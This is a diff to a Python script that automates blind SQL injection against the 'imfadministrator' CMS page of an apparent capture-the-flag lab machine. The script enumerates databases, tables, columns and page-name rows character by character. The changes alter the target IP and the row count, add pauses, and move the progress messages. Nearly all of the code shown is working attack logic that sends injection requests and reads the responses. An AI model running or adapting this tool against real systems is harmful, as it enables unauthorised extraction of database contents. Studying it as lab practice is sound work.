@@ -16,7 +16,7 @@ signal.signal(signal.SIGINT, def_handler)
 
 
 # Global variables
-URL = "http://192.168.1.93/imfadministrator/"
+URL = "http://192.168.1.81/imfadministrator/"
 VULNERABLE_URL = URL + "cms.php?pagename=home"
 CHARS = string.ascii_lowercase + string.digits + "_-"
 
@@ -26,7 +26,7 @@ def enum_pagename_column(cookies):
     p1 = log.progress("[admin][pages][pagename] Data")
     time.sleep(2)
 
-    for row in range(6):
+    for row in range(4):
         data = ""
         for position_character in range(30):
             if len(data)+1 < position_character:
@@ -50,6 +50,7 @@ def enum_pagename_column(cookies):
                     p1.status(rows + data)
                     break
     p1.success(rows)
+    time.sleep(1)
     return
 
 
@@ -85,6 +86,7 @@ def get_columns_names(cookies, columns):
                     p1.status(columns_names + data)
                     break
     p1.success(columns_names)
+    time.sleep(1)
     return
 
 
@@ -105,14 +107,15 @@ def get_columns(cookies):
         r = requests.get(VULNERABLE_URL + payload, cookies=cookies)
 
         if "Welcome to the IMF Administration." in r.text:
-            p1.success(str(columns) + " available")
             break
+    p1.success(str(columns) + " available")
+    time.sleep(1)
     return columns
 
 
 def get_tables_names(cookies, tables):
     tables_names = ""
-    p1 = log.progress("[admin] Table name")
+    p1 = log.progress("[admin] Tables")
     time.sleep(2)
 
     for table in range(tables):
@@ -139,6 +142,7 @@ def get_tables_names(cookies, tables):
                     p1.status(tables_names + data)
                     break
     p1.success(tables_names)
+    time.sleep(1)
     return
 
 
@@ -159,8 +163,9 @@ def get_tables(cookies):
         payload = payload.replace('\n', '')
         r = requests.get(VULNERABLE_URL + payload, cookies=cookies)
         if "Welcome to the IMF Administration." in r.text:
-            p1.success(str(tables) + " available")
             break
+    p1.success(str(tables) + " available")
+    time.sleep(1)
     return tables
 
 
@@ -192,6 +197,7 @@ def get_dbs_names(cookies, dbs):
                     p1.status(databases + data)
                     break
     p1.success(databases)
+    time.sleep(1)
     return
 
 
@@ -210,8 +216,9 @@ def get_dbs(cookies):
         payload = payload.replace('\n', '')
         r = requests.get(VULNERABLE_URL + payload, cookies=cookies)
         if "Welcome to the IMF Administration." in r.text:
-            p1.success(str(dbs) + " available")
             break
+    p1.success(str(dbs) + " available")
+    time.sleep(1)
     return dbs
 
 
@@ -230,12 +237,15 @@ def main():
 
     dbs = get_dbs(cookies)
     get_dbs_names(cookies, dbs)
+    print()
 
     tables = get_tables(cookies)
     get_tables_names(cookies, tables)
+    print()
 
     columns = get_columns(cookies)
     get_columns_names(cookies, columns)
+    print()
 
     enum_pagename_column(cookies)
     return
